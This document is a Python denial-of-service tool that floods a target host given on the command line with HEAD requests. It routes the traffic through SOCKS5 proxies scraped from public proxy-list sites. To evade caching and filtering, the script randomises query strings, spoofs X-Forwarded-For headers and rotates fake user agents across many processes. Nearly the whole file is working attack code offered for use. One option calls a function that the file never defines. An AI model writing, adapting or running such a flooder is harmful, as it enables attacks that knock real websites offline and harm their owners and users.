import ssl
import multiprocessing
import socket
import random
import time
import sys
import socks # pysocks
import requests # requests
from fake_useragent import UserAgent # fake-useragent

# Init

targetHost = sys.argv[1]
targetPort = int(sys.argv[2])
threadNumber = int(sys.argv[3])
targetPath = sys.argv[4]
rI = random.randint
proxyFile = "socks5.txt"
rC = random.choice
queryParams = [
    "s",
    "a",
    "q",
    "id",
    "page",
    "search",
    "controller",
    "language",
    "data",
    "field"
]
proxyResources = [
    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=socks5',
    'https://www.proxyscan.io/download?type=socks5',
]


connectProxyHeader = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(targetHost)

def socksCrawler():
    global socksFile, socksResources
    f = open(proxyFile, "wb")
    for url in proxyResources:
        try:
            f.write(requests.get(url).content)
        except:
            pass
    f.close()
time.sleep(1)
def Flood(indexPicker):
    if indexPicker < len(proxies):
        proxy = proxies[indexPicker].strip().split(":")
    else:
        proxy = rC(proxies).strip().split(":")
    userAgent = rC(userAgentList)
    Connection = "Connection: Keep-Alive\r\n"
    Accept = "Accept: */*\r\n"
    Referer = "Referer: https://google.com?q=" + targetHost + "\r\n"
    X_Forwarded_For = f"X-Forwarded-For: {proxy[0]}, {proxy[0][::-1]}\r\n"
    User_Agent = "User-Agent: " + userAgent + "\r\n\r\n"
    while True:
        try:
            socks.setdefaultproxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s = socks.socksocket()
            s.connect((targetHost, targetPort))
            if targetPort == 443:
                sslContext = ssl.SSLContext()
                s = sslContext.wrap_socket(s, server_hostname=targetHost)
            for _ in range(100):
                valueParams = f"?{rC(queryParams)}={rI(1, 65535)}&{rC(queryParams)}={rI(1, 65535)}"
                floodHeader = f"HEAD {targetPath}{valueParams} HTTP/1.1\r\nHost: {targetHost}\r\n" + Connection + Accept + Referer + X_Forwarded_For + User_Agent
                s.send(str(floodHeader).encode())
            print("Flood sent " + proxy[0] + ":" + proxy[1])
        except:
            time.sleep(.1)

if "--socksCrawler" in sys.argv:
    socksCrawler()
else:
    pass

if "--useMyFile" in sys.argv:
    proxyFile = input("Your file: ")
    proxies = open(proxyFile).readlines()
else:
    proxies = open("socks5.txt").readlines()

if "--checkProxies" in sys.argv:
    proxies = open(proxyFile).readlines()
    checkProxies()
else:
    proxies = open("socks5.txt").readlines()
userAgentList = []
for _ in range(100):
    userAgent = UserAgent().random
    userAgentList.append(userAgent)
processList = []
for indexPicker in range(threadNumber):
    process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
    process.setDaemon = False
    process.start()
